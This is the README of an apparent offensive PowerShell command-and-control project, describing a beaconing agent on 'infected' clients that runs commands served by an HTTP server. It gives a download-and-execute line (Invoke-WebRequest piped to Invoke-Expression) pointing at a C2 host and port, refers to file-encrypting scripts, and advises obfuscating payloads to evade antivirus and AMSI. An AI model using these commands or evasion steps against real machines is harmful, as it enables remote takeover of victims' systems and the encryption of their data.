[![Obfuscate PowerShell Files](https://github.com/AndreiVladescu/Powershell-C2/actions/workflows/obfuscation_job.yml/badge.svg?event=push)](https://github.com/AndreiVladescu/Powershell-C2/actions/workflows/obfuscation_job.yml)
# Powershell-C2 Server

This is a primitive c2 server through an HTTP server. After the client has been infected with the  beaconing agent, it waits for a random time before requesting data from the C2. The beacon agent will execute the command sent.

### Script structure
Some of powershell scripts that are included must be modified before-hand, with correct URLs or IPs. Be sure to read them and understand them before running, and be especially aware of the encrypting stuff. Know your keys, so that if in case you encrypt by mistake some files, you can recover them after.

Scripts are split into multiple folders with the type of attack  it encompasses.

### Script calling
To execute a script, use the following command in the field of `response_content`:
`Invoke-WebRequest -Uri "http://<c2_ip>:<c2_port>/<resource_name>"  | Invoke-Expression`

One example would be:
`Invoke-WebRequest -Uri "http://10.0.2.2:8080/shrek_wallpaper"  | Invoke-Expression`, which calls resource `shrek_wallpaper` from the C2, that's available at `10.0.2.2`, on port `8080`. 

This command is inserted in the line of response_content of the C2 python file:
`response_content = r'''Invoke-WebRequest -Uri "http://10.0.2.2:8080/shrek_wallpaper"  | Invoke-Expression'''`

### Obfuscating the scripts

The payloads will need some obfuscation, as antivirius solutions will definitely pick up the signatures of base64 encoding or other things. Some links which I used to obfuscate are:

 - [PowerShell-Obfuscation-Bible](https://github.com/t3l3machus/PowerShell-Obfuscation-Bible)
 - [AMSITrigger](https://github.com/RythmStick/AMSITrigger)
 
 Things you need to do are described in Powershell Obfuscation Bible. 


